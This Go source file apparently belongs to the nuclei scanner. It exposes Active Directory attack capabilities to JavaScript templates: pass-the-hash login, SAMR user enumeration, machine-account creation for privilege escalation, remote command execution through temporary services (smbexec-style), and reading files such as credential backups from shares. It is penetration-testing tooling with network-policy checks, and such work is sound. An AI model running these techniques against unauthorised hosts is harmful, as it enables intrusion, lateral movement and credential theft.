// Package dcerpc exposes a small subset of the mandiant/gopacket DCE/RPC
// stack to nuclei javascript templates. It is the entry point for AD attack
// templates that need to talk EPMAPPER / SAMR / LSARPC / SVCCTL / TSCH / WINREG
// to a domain controller or member server.
//
// All host arguments are validated against the per-execution network policy
// before any traffic is sent. The actual TCP dial is performed via gopacket's
// transport package, which nuclei rewires to its fastdialer at startup, so
// proxy / DNS caching / network policy all apply transparently.
package dcerpc

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	gprpc "github.com/Mzack9999/goimpacket/pkg/dcerpc"
	gpepm "github.com/Mzack9999/goimpacket/pkg/dcerpc/epmapper"
	gplsa "github.com/Mzack9999/goimpacket/pkg/dcerpc/lsarpc"
	gpsamr "github.com/Mzack9999/goimpacket/pkg/dcerpc/samr"
	gpsvcctl "github.com/Mzack9999/goimpacket/pkg/dcerpc/svcctl"
	gpsession "github.com/Mzack9999/goimpacket/pkg/session"
	gpsmb "github.com/Mzack9999/goimpacket/pkg/smb"
	"github.com/Mzack9999/goja"

	"github.com/projectdiscovery/nuclei/v3/pkg/js/utils"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/common/protocolstate"
)

// Endpoint is a flat representation of an entry returned by the EPMAPPER.
type Endpoint = gpepm.Endpoint

// DomainUser is a SAMR domain user record.
type DomainUser = gpsamr.DomainUser

// LookupResult is the result of a SID->name resolution via LSARPC.
type LookupResult = gplsa.LookupResult

type (
	// Client is a stateful DCE/RPC + SMB client backed by mandiant/gopacket.
	// One Client wraps one authenticated SMB session against the target host;
	// individual RPC interfaces (SAMR, LSARPC, EPMAPPER, ...) are bound on
	// demand by the corresponding helper methods.
	//
	// @example
	// ```javascript
	// const dcerpc = require('nuclei/dcerpc');
	// const c = new dcerpc.Client('dc01.acme.local', 'acme.local', 'admin', 'P@ssw0rd');
	// const endpoints = c.RpcDump();
	// log(to_json(endpoints));
	// ```
	Client struct {
		Host    string
		Domain  string
		User    string
		Pass    string
		NTHash  string
		KrbCC   string
		Port    int
		nj      *utils.NucleiJS
		creds   *gpsession.Credentials
		target  gpsession.Target
		smb     *gpsmb.Client
		started bool
	}
)

// NewClient constructs a DCE/RPC client. Authentication is NTLM by default;
// pass an empty password and use SetHash to enable pass-the-hash.
//
// Constructor: constructor(host string, domain string, user string, password string)
func NewClient(call goja.ConstructorCall, runtime *goja.Runtime) *goja.Object {
	c := &Client{nj: utils.NewNucleiJS(runtime)}
	c.nj.ObjectSig = "Client(host, domain, user, password)"

	c.Host, _ = c.nj.GetArg(call.Arguments, 0).(string)
	c.Domain, _ = c.nj.GetArg(call.Arguments, 1).(string)
	c.User, _ = c.nj.GetArg(call.Arguments, 2).(string)
	c.Pass, _ = c.nj.GetArg(call.Arguments, 3).(string)
	c.Port = 445

	c.nj.Require(c.Host != "", "host cannot be empty")
	if !protocolstate.IsHostAllowed(c.nj.ExecutionId(), c.Host) {
		c.nj.Throw("host %s blacklisted by network policy", c.Host)
	}

	c.creds = &gpsession.Credentials{
		Domain:   c.Domain,
		Username: c.User,
		Password: c.Pass,
	}
	c.target = gpsession.Target{Host: c.Host, Port: c.Port}
	return utils.LinkConstructor(call, runtime, c)
}

// SetHash enables NTLM pass-the-hash authentication.
// hash may be the bare NT hash or "<lm>:<nt>".
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', '');
// c.SetHash('aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0');
// ```
func (c *Client) SetHash(hash string) {
	c.creds.Hash = hash
	c.creds.Password = ""
}

// SetKerberos switches the client to Kerberos authentication. dcIP optionally
// pins the KDC IP when DNS is uncooperative.
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01.acme.local', 'acme.local', 'admin', 'P@ss');
// c.SetKerberos('10.10.10.10');
// ```
func (c *Client) SetKerberos(dcIP string) {
	c.creds.UseKerberos = true
	c.creds.DCIP = dcIP
}

// SetPort overrides the default SMB port (445).
func (c *Client) SetPort(port int) {
	c.Port = port
	c.target.Port = port
}

// connect lazily establishes the underlying SMB session that all RPC
// transports are tunneled through. The SMB Client is bound to a Dialer that
// captures this client's executionId so every dial inside goimpacket is
// validated against the same network policy.
func (c *Client) connect() error {
	if c.started {
		return nil
	}
	if !protocolstate.IsHostAllowed(c.nj.ExecutionId(), c.Host) {
		return protocolstate.ErrHostDenied.Msgf(c.Host)
	}
	c.smb = gpsmb.NewClientWithDialer(c.target, c.creds, NewExecDialer(c.nj.ExecutionId()))
	if err := c.smb.Connect(); err != nil {
		return fmt.Errorf("smb connect: %w", err)
	}
	c.started = true
	return nil
}

// Close releases the underlying SMB session.
func (c *Client) Close() {
	if c.smb != nil {
		c.smb.Close()
	}
	c.started = false
}

// rpcOverNamedPipe binds the supplied interface UUID over a named pipe and
// returns an authenticated *dcerpc.Client.
func (c *Client) rpcOverNamedPipe(pipe string, uuid [16]byte, major, minor uint16) (*gprpc.Client, error) {
	if err := c.connect(); err != nil {
		return nil, err
	}
	pf, err := c.smb.OpenPipe(pipe)
	if err != nil {
		return nil, fmt.Errorf("open pipe %q: %w", pipe, err)
	}
	rpc := gprpc.NewClient(pf)
	if err := rpc.BindAuth(uuid, major, minor, c.creds); err != nil {
		_ = pf.Close()
		return nil, fmt.Errorf("dcerpc bind: %w", err)
	}
	return rpc, nil
}

// RpcDump enumerates every RPC endpoint registered with the EPMAPPER over
// ncacn_ip_tcp/135 (impacket: rpcdump.py).
//
// @example
// ```javascript
// const dcerpc = require('nuclei/dcerpc');
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const eps = c.RpcDump();
// for (const e of eps) { log(e.UUID + ' ' + e.Annotation); }
// ```
func (c *Client) RpcDump(ctx context.Context) ([]Endpoint, error) {
	if !protocolstate.IsHostAllowed(c.nj.ExecutionId(), c.Host) {
		return nil, protocolstate.ErrHostDenied.Msgf(c.Host)
	}
	dialer := protocolstate.GetDialersWithId(c.nj.ExecutionId())
	if dialer == nil {
		return nil, fmt.Errorf("dialers not initialized for execution %s", c.nj.ExecutionId())
	}
	conn, err := dialer.Fastdialer.Dial(ctx, "tcp", net.JoinHostPort(c.Host, strconv.Itoa(135)))
	if err != nil {
		return nil, fmt.Errorf("dial epmapper: %w", err)
	}
	defer func() { _ = conn.Close() }()

	rpc := gprpc.NewClientTCP(gprpc.NewTCPTransport(conn))
	if err := rpc.Bind(gpepm.UUID, gpepm.MajorVersion, gpepm.MinorVersion); err != nil {
		return nil, fmt.Errorf("epmapper bind: %w", err)
	}
	epm := gpepm.NewEpmClient(rpc)
	return epm.Lookup()
}

// SamrEnumerateUsers connects to SAMR and returns every domain user record
// (impacket: samrdump.py).
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const users = c.SamrEnumerateUsers();
// for (const u of users) { log(u.Name + ' ' + u.RID); }
// ```
func (c *Client) SamrEnumerateUsers() ([]DomainUser, error) {
	rpc, err := c.rpcOverNamedPipe("samr", gpsamr.UUID, gpsamr.MajorVersion, gpsamr.MinorVersion)
	if err != nil {
		return nil, err
	}
	defer func() {
		_ = rpc.Transport.Close()
	}()

	samr := gpsamr.NewSamrClient(rpc, rpc.GetSessionKey())
	if err := samr.Connect(); err != nil {
		return nil, fmt.Errorf("samr connect: %w", err)
	}
	if err := samr.OpenDomain(c.Domain); err != nil {
		return nil, fmt.Errorf("samr open domain: %w", err)
	}
	defer samr.Close()
	return samr.EnumerateDomainUsers()
}

// SamrAddComputer creates a new machine account using the supplied password.
// Useful as the first step in many AD escalations (RBCD / shadow credentials).
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// c.SamrAddComputer('NUCLEI$', 'C0mputerP@ss!');
// ```
func (c *Client) SamrAddComputer(name, password string) error {
	c.nj.Require(name != "", "computer name cannot be empty")
	c.nj.Require(password != "", "computer password cannot be empty")
	rpc, err := c.rpcOverNamedPipe("samr", gpsamr.UUID, gpsamr.MajorVersion, gpsamr.MinorVersion)
	if err != nil {
		return err
	}
	defer func() {
		_ = rpc.Transport.Close()
	}()

	samr := gpsamr.NewSamrClient(rpc, rpc.GetSessionKey())
	if err := samr.Connect(); err != nil {
		return fmt.Errorf("samr connect: %w", err)
	}
	if err := samr.OpenDomain(c.Domain); err != nil {
		return fmt.Errorf("samr open domain: %w", err)
	}
	defer samr.Close()
	return samr.CreateComputer(name, password)
}

// SmbExecResult is returned by SmbExec.
type SmbExecResult struct {
	ServiceName string `json:"service_name"`
	Output      string `json:"output"`
}

// SmbExec executes a Windows command on the target host using the
// SVCCTL "create + start service" technique (impacket: smbexec.py / psexec.py).
// The command's stdout/stderr is captured by writing to the chosen share
// (default C$) and read back over SMB. Local admin equivalent rights are
// required on the target.
//
// command  - the command line to run; for powershell prefix with
//
//	`powershell -EncodedCommand <b64utf16>` or use any cmd one-liner.
//
// share    - writable share to stage the output file in (default "C$").
//
// @example
// ```javascript
// const dcerpc = require('nuclei/dcerpc');
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const r = c.SmbExec('whoami /all', 'C$');
// log(r.output);
// ```
func (c *Client) SmbExec(command, share string) (*SmbExecResult, error) {
	c.nj.Require(command != "", "command cannot be empty")
	if share == "" {
		share = "C$"
	}
	if !protocolstate.IsHostAllowed(c.nj.ExecutionId(), c.Host) {
		return nil, protocolstate.ErrHostDenied.Msgf(c.Host)
	}
	if err := c.connect(); err != nil {
		return nil, err
	}

	pf, err := c.smb.OpenPipe("svcctl")
	if err != nil {
		return nil, fmt.Errorf("open svcctl pipe: %w", err)
	}
	defer func() {
		_ = pf.Close()
	}()

	rpc := gprpc.NewClient(pf)
	if err := rpc.Bind(gpsvcctl.UUID, gpsvcctl.MajorVersion, gpsvcctl.MinorVersion); err != nil {
		return nil, fmt.Errorf("svcctl bind: %w", err)
	}
	sc, err := gpsvcctl.NewServiceController(rpc)
	if err != nil {
		return nil, fmt.Errorf("svcctl open scm: %w", err)
	}
	defer sc.Close()

	if err := c.smb.UseShare(share); err != nil {
		return nil, fmt.Errorf("use share %s: %w", share, err)
	}

	svcName := randName(8)
	batchFile := randName(8) + ".bat"
	outputFile := "__nuclei_" + randName(6)

	// Wrap user command to redirect output to <share>\<outputFile>.
	// Embed escaped form per Impacket's smbexec.py construction.
	outputUNC := fmt.Sprintf("\\\\%%COMPUTERNAME%%\\%s\\%s", share, outputFile)
	wrapped := "%COMSPEC% /Q /c echo (" + escapeForEcho(command) + ") ^> " + outputUNC + " 2^>^&1 > %TEMP%\\" + batchFile +
		" & %COMSPEC% /Q /c %TEMP%\\" + batchFile +
		" & del %TEMP%\\" + batchFile

	svcHandle, err := sc.CreateService(svcName, svcName, wrapped,
		gpsvcctl.SERVICE_WIN32_OWN_PROCESS, gpsvcctl.SERVICE_DEMAND_START, gpsvcctl.ERROR_IGNORE)
	if err != nil {
		return nil, fmt.Errorf("create service: %w", err)
	}
	// StartService is expected to time out (the service binary is the command
	// itself, not a real service), so we ignore the error. We immediately
	// delete the service to keep the host clean.
	_ = sc.StartService(svcHandle)
	_ = sc.DeleteService(svcHandle)
	_ = sc.CloseServiceHandle(svcHandle)

	// Poll up to 10s for the output file to appear and become readable.
	var out string
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		s, err := c.smb.Cat(outputFile)
		if err == nil && s != "" {
			out = s
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	_ = c.smb.Rm(outputFile)
	return &SmbExecResult{ServiceName: svcName, Output: out}, nil
}

// escapeForEcho escapes shell metacharacters that break inside `echo (...) ^> ...`
// This mirrors Impacket's smbexec.py escapeShell helper.
func escapeForEcho(s string) string {
	r := strings.NewReplacer(
		"^", "^^",
		"&", "^&",
		"|", "^|",
		"<", "^<",
		">", "^>",
		"\"", "\\\"",
	)
	return r.Replace(s)
}

func randName(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)[:n]
}

// SmbListShares enumerates the SMB shares exposed by the target.
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// for (const s of c.SmbListShares()) { log(s); }
// ```
func (c *Client) SmbListShares() ([]string, error) {
	if err := c.connect(); err != nil {
		return nil, err
	}
	return c.smb.ListShares()
}

// SmbCat reads the contents of a single file from the given share. The path
// is interpreted relative to the share root (use forward slashes).
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const txt = c.SmbCat('backup', 'backup_credentials.txt');
// log(txt);
// ```
func (c *Client) SmbCat(share, file string) (string, error) {
	c.nj.Require(share != "", "share cannot be empty")
	c.nj.Require(file != "", "file cannot be empty")
	if err := c.connect(); err != nil {
		return "", err
	}
	if err := c.smb.UseShare(share); err != nil {
		return "", fmt.Errorf("use share %s: %w", share, err)
	}
	return c.smb.Cat(file)
}

// SmbLs lists files under dir on the given share. dir = "" lists the root.
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const entries = c.SmbLs('backup', '');
// for (const e of entries) { log(e.Name + (e.IsDir ? '/' : '')); }
// ```
type FileEntry struct {
	Name  string `json:"name"`
	Size  int64  `json:"size"`
	IsDir bool   `json:"is_dir"`
}

func (c *Client) SmbLs(share, dir string) ([]FileEntry, error) {
	c.nj.Require(share != "", "share cannot be empty")
	if err := c.connect(); err != nil {
		return nil, err
	}
	if err := c.smb.UseShare(share); err != nil {
		return nil, fmt.Errorf("use share %s: %w", share, err)
	}
	infos, err := c.smb.Ls(dir)
	if err != nil {
		return nil, err
	}
	out := make([]FileEntry, 0, len(infos))
	for _, fi := range infos {
		out = append(out, FileEntry{Name: fi.Name(), Size: fi.Size(), IsDir: fi.IsDir()})
	}
	return out, nil
}

// LsaLookupSids resolves an array of SIDs to (domain, name, type) triples
// against LSARPC (impacket: lookupsid.py).
//
// @example
// ```javascript
// const c = new dcerpc.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const r = c.LsaLookupSids(['S-1-5-21-...-500']);
// log(to_json(r));
// ```
func (c *Client) LsaLookupSids(sids []string) ([]LookupResult, error) {
	c.nj.Require(len(sids) > 0, "at least one SID must be provided")
	rpc, err := c.rpcOverNamedPipe("lsarpc", gplsa.UUID, gplsa.MajorVersion, gplsa.MinorVersion)
	if err != nil {
		return nil, err
	}
	defer func() {
		_ = rpc.Transport.Close()
	}()

	lsa, err := gplsa.NewLsaClient(rpc)
	if err != nil {
		return nil, fmt.Errorf("lsa init: %w", err)
	}
	if err := lsa.OpenPolicy2(); err != nil {
		return nil, fmt.Errorf("lsa OpenPolicy2: %w", err)
	}
	defer lsa.Close()
	return lsa.LookupSids(sids)
}
